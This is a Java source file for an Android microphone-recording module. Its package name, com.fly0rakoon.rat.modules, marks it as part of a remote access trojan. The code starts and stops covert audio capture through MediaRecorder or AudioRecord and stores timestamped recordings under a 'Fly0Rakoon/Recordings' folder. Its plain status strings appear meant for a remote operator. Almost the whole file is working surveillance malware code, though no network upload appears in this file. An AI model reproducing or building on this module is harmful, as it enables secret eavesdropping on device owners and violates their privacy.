package com.fly0rakoon.rat.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MicModule {
    
    private static final String TAG = "MicModule";
    
    // Audio recording parameters
    private static final int SAMPLE_RATE = 44100;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int BUFFER_SIZE = AudioRecord.getMinBufferSize(
        SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT) * 2;
    
    private Context context;
    private AudioRecord audioRecord;
    private Thread recordingThread;
    private AtomicBoolean isRecording = new AtomicBoolean(false);
    private String currentRecordingPath;
    private MediaRecorder mediaRecorder;
    private boolean useMediaRecorder = true; // MediaRecorder is easier for common formats
    
    public MicModule(Context context) {
        this.context = context;
    }
    
    public String startRecording() {
        // Check permission
        if (!checkMicrophonePermission()) {
            return "ERROR: Microphone permission not granted";
        }
        
        // Stop any existing recording
        if (isRecording.get()) {
            stopRecording();
        }
        
        try {
            // Create output file
            File recordingFile = createOutputFile();
            if (recordingFile == null) {
                return "ERROR: Could not create output file";
            }
            
            currentRecordingPath = recordingFile.getAbsolutePath();
            
            // Use MediaRecorder for simplicity (produces AAC/AMR/MP4)
            if (useMediaRecorder) {
                return startMediaRecorder(recordingFile);
            } else {
                // Use AudioRecord for raw PCM (more control but more complex)
                return startAudioRecord(recordingFile);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting recording: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }
    
    private String startMediaRecorder(File outputFile) {
        try {
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioSamplingRate(SAMPLE_RATE);
           
            mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording.set(true);
            
            Log.d(TAG, "MediaRecorder started: " + outputFile.getAbsolutePath());
            return "OK: Recording started - " + outputFile.getName();
            
        } catch (IOException e) {
            Log.e(TAG, "MediaRecorder error: " + e.getMessage());
            releaseMediaRecorder();
            return "ERROR: " + e.getMessage();
        } catch (IllegalStateException e) {
            Log.e(TAG, "MediaRecorder state error: " + e.getMessage());
            releaseMediaRecorder();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private String startAudioRecord(File outputFile) {
        try {
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                BUFFER_SIZE
            );
            
            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                return "ERROR: AudioRecord initialization failed";
            }
            
            audioRecord.startRecording();
            isRecording.set(true);
            
            // Start recording thread
            recordingThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    writeAudioDataToFile(outputFile);
                }
            });
            recordingThread.start();
            
            Log.d(TAG, "AudioRecord started: " + outputFile.getAbsolutePath());
            return "OK: Recording started - " + outputFile.getName();
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception: " + e.getMessage());
            return "ERROR: Security exception";
        } catch (Exception e) {
            Log.e(TAG, "Error starting AudioRecord: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }
    
    private void writeAudioDataToFile(File outputFile) {
        byte[] audioData = new byte[BUFFER_SIZE];
        FileOutputStream fos = null;
        
        try {
            fos = new FileOutputStream(outputFile);
            
            while (isRecording.get()) {
                int bytesRead = audioRecord.read(audioData, 0, BUFFER_SIZE);
                if (bytesRead > 0) {
                    fos.write(audioData, 0, bytesRead);
                }
            }
            
        } catch (IOException e) {
            Log.e(TAG, "Error writing audio data: " + e.getMessage());
        } finally {
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    Log.e(TAG, "Error closing file: " + e.getMessage());
                }
            }
        }
    }
    
    public String stopRecording() {
        if (!isRecording.get()) {
            return "ERROR: No recording in progress";
        }
        
        try {
            isRecording.set(false);
            
            if (useMediaRecorder && mediaRecorder != null) {
                try {
                    mediaRecorder.stop();
                } catch (IllegalStateException e) {
                    Log.e(TAG, "MediaRecorder stop error: " + e.getMessage());
                }
                releaseMediaRecorder();
            } else if (audioRecord != null) {
                try {
                    audioRecord.stop();
                } catch (IllegalStateException e) {
                    Log.e(TAG, "AudioRecord stop error: " + e.getMessage());
                }
                
                if (recordingThread != null) {
                    try {
                        recordingThread.join(2000);
                    } catch (InterruptedException e) {
                        Log.e(TAG, "Thread join interrupted: " + e.getMessage());
                    }
                }
                
                releaseAudioRecord();
            }
            
            // Get file info
            File recordedFile = new File(currentRecordingPath);
            if (recordedFile.exists()) {
                long fileSize = recordedFile.length();
                String fileSizeStr = formatFileSize(fileSize);
                
                Log.d(TAG, "Recording stopped. File: " + currentRecordingPath + 
                    ", Size: " + fileSizeStr);
                
                return "OK: Recording stopped - " + recordedFile.getName() + 
                    " (" + fileSizeStr + ")";
            } else {
                return "OK: Recording stopped";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping recording: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }
    
    private File createOutputFile() {
        // Check external storage state
        String state = Environment.getExternalStorageState();
        if (!Environment.MEDIA_MOUNTED.equals(state)) {
            Log.e(TAG, "External storage not mounted");
            return null;
        }
        
        // Create directory
        File recordingDir = new File(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
            "Fly0Rakoon/Recordings"
        );
        if (!recordingDir.exists()) {
            if (!recordingDir.mkdirs()) {
                Log.e(TAG, "Failed to create directory");
                return null;
            }
        }
        
        // Create filename with timestamp
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
        String fileName;
        
        if (useMediaRecorder) {
            fileName = "AUDIO_" + timeStamp + ".m4a";
        } else {
            fileName = "AUDIO_" + timeStamp + ".pcm";
        }
        
        return new File(recordingDir, fileName);
    }
    
    private boolean checkMicrophonePermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
    }
    
    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.reset();
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing MediaRecorder: " + e.getMessage());
            }
            mediaRecorder = null;
        }
    }
    
    private void releaseAudioRecord() {
        if (audioRecord != null) {
            try {
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing AudioRecord: " + e.getMessage());
            }
            audioRecord = null;
        }
    }
    
    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        
        final String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        
        return String.format(Locale.US, "%.1f %s", 
            size / Math.pow(1024, digitGroups), units[digitGroups]);
    }
    
    public boolean isRecording() {
        return isRecording.get();
    }
    
    public String getCurrentRecordingPath() {
        return currentRecordingPath;
    }
}
